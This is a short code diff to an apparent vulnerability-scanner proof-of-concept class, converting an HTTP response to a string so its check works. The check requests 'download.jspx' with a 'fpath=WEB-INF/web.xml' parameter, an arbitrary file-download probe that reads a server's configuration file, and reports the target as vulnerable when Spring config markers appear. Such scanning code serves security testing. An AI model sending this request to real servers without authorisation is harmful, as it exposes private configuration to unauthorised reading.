@@ -57,7 +57,7 @@ class Poc(ABPoc):
                 target=self.target)+"/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml"
             request = urllib.request.Request(verify_url)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             if 'WEB-INF/config/' in content and 'contextConfigLocation' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
